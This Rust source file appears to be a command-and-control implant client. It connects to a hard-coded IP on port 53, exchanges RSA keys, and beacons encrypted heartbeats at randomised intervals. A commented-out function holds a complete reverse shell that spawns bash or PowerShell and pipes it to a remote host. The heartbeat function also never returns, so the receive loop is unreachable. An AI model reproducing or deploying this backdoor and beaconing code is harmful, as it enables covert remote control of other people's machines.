use rand::rngs::OsRng;
use rand::Rng;
use rsa::PublicKey;
use rsa::{pkcs8::FromPublicKey, pkcs8::ToPublicKey, PaddingScheme, RsaPrivateKey, RsaPublicKey};
use serde::{Deserialize, Serialize};
use tokio::io;
use tokio::io::AsyncReadExt;
use tokio::io::AsyncWriteExt;
use tokio::net::tcp::OwnedWriteHalf;
use tokio::net::TcpStream;

#[derive(Serialize, Deserialize)]
struct Message {
    user_sender: String,
    user_receiver: String,
    message_type: String,
    message_content: String,
}

fn trim_newline(s:&mut String){
    while s.ends_with('\n') || s.ends_with('\r') || s.ends_with('\u{0}') {
        s.pop();
    };
}

async fn heartbeat(
    s_write:&mut OwnedWriteHalf,
    username_string: &String,
    srv_pub_key: &RsaPublicKey,
    mut rng: OsRng,
) -> OwnedWriteHalf {
    loop {
        let s = "available".to_string();
        let message_type = "heartbeat".to_string();
        // check if message is private or global
        let message_must_sended = true;

        // check if message is correct
        if message_must_sended {
            let message_to_send = Message {
                user_sender: username_string.to_string(),
                user_receiver: "Server".to_string(),
                message_type: message_type,
                message_content: s,
            };

            // message sending
            let json_message = serde_json::to_string(&message_to_send).unwrap();
            println!("{:?}", json_message);
            let enc_data = srv_pub_key.encrypt(&mut rng, PaddingScheme::new_pkcs1v15_encrypt(), &json_message.as_bytes()).expect("failed to encrypt");
            s_write.write_all(&enc_data).await.unwrap();
        }
    }
}
/*
fn  reverseshell(host: String, port: String) {
    match TcpStream::connect(format!("{}:{}", host, port)) {
        Ok(socket) => {
            let mut tcp_stdin = BufReader::new(socket.try_clone().unwrap());
            let mut tcp_stderr = BufWriter::new(socket.try_clone().unwrap());
            let mut tcp_stdout = BufWriter::new(socket);
            let command = if cfg!(target_os = "windows") {
                "powershell.exe"
            } else {
                "/bin/bash"
            };
            let mut process = Command::new(command)
                .stdin(Stdio::piped())
                .stdout(Stdio::piped())
                .stderr(Stdio::piped())
                .spawn().unwrap();
            let mut stdout = BufReader::new(process.stdout.take().unwrap());
            let mut stderr = BufReader::new(process.stderr.take().unwrap());
            let mut stdin = process.stdin.take().unwrap();
            // stdout
            thread::spawn(move || {
                loop {
                    let mut output = vec![];
                    // read in loop until a space because the last character before the child shell waits for input in stdin again is a space
                    // this is definitely not the cleanest way to do it but I didn't find any other way to read exactly until the child waits for stdin, e.g. read_to_end() create a deadlock and iterate over lines() do not send the last line written on the shell, where we can see again our working directory and make a new command
                    // if you find a better way to do this, feel free to make a pull request
                    stdout.read_until(b' ', &mut output).expect("Failed to read stdout");
                    
                    match tcp_stdout.write(&output) {
                        Ok(0) | Err(_) => break,
                        Ok(_) => tcp_stdout.flush().expect("Failed to flush TCP stdout buffer")
                    }
                }
            });
            // stderr
            thread::spawn(move || {
                loop {
                    let mut output = vec![];
                    // almost the same as stdout but this time we're able to read until \n instead of a space, for better buffering
                    stderr.read_until(b'\n', &mut output).expect("Failed to read stderr");
                    
                    match tcp_stderr.write(&output) {
                        Ok(0) | Err(_) => break,
                        Ok(_) => tcp_stderr.flush().expect("Failed to flush TCP stderr buffer")
                    }
                }
            });
            // stdin
            loop {
                let mut command = String::new();
                match tcp_stdin.read_line(&mut command) {
                    Ok(0) | Err(_) => break,
                    Ok(_) => stdin.write_all(command.as_bytes()).expect("Failed to write to stdin")
                }
            }
        }
        Err(error) => {
            println!("Connection to the socket failed: {}", error);
        }
    }
}
*/
#[tokio::main]
async fn main() -> io::Result<()> {
    // Generate priv and pub key of client
    let mut rng = OsRng;
    let bits = 2048;
    let priv_key = RsaPrivateKey::new(&mut rng, bits).expect("failed to generate a key");
    let pub_key = RsaPublicKey::from(&priv_key);
    let pub_key_pem = RsaPublicKey::to_public_key_pem(&pub_key).unwrap();
    println!("ping");

    // Username input
    let username = "bobby".to_string();

    // TCP Stream creation

    let mut _stream = TcpStream::connect("192.168.1.41:53").await?;
    let (mut reader, mut writer) = _stream.into_split();

    // Send public key
    let message_type = "pkey".to_string();
    let pbkey_to_send = Message {
        user_sender: "".to_string(),
        user_receiver: "".to_string(),
        message_type: message_type,
        message_content: pub_key_pem,
    };
    let json_message = serde_json::to_string(&pbkey_to_send).unwrap();
    writer.write_all(json_message.as_bytes()).await.unwrap();

    // Get public key from server
    let mut buf = [0; 4096];
    let _readed = reader.read(&mut buf).await;
    let mut rcv_msg = String::from_utf8_lossy(&buf).to_string();
    while rcv_msg.ends_with('\n') || rcv_msg.ends_with('\r') || rcv_msg.ends_with('\u{0}') {
        rcv_msg.pop();
    }

    let json_message: Message = serde_json::from_str(&rcv_msg).unwrap();
    let srv_pub_key = RsaPublicKey::from_public_key_pem(&json_message.message_content).unwrap();
    println!("{:?}", srv_pub_key);
    // send username to server
    let message_type = "login".to_string();

    let username_to_send = Message {
        user_sender: username.to_string(),
        user_receiver: "Server".to_string(),
        message_type: message_type,
        message_content: username.to_string(),
    };
    let json_message = serde_json::to_string(&username_to_send).unwrap();
    let enc_data = srv_pub_key
        .encrypt(
            &mut rng,
            PaddingScheme::new_pkcs1v15_encrypt(),
            &json_message.as_bytes(),
        )
        .expect("failed to encrypt");
    writer.write_all(&enc_data).await.unwrap();

    // Spawn thread
    let rng_thread = rng.clone();
    loop{
        let sleep_time = std::time::Duration::from_secs(rng.gen_range(10..30));
        std::thread::sleep(sleep_time);
        println!("Sending heartbeat");
        heartbeat(&mut writer, &username, &srv_pub_key, rng_thread).await;

        let mut buf = [0; 4096];
        let n = reader.read(&mut buf[..]).await?;
        let dec_data = priv_key.decrypt(PaddingScheme::new_pkcs1v15_encrypt(), &buf[..n]).expect("failed to decrypt");
        assert_ne!(&dec_data, &buf[..n]);
        
        let mut rcv_msg = String::from_utf8_lossy(&dec_data).to_string();
        trim_newline(&mut rcv_msg);

        let json_message: Message = serde_json::from_str(&rcv_msg).unwrap();
        println!("{:?}", json_message.message_content);
    }

    //Shell
}
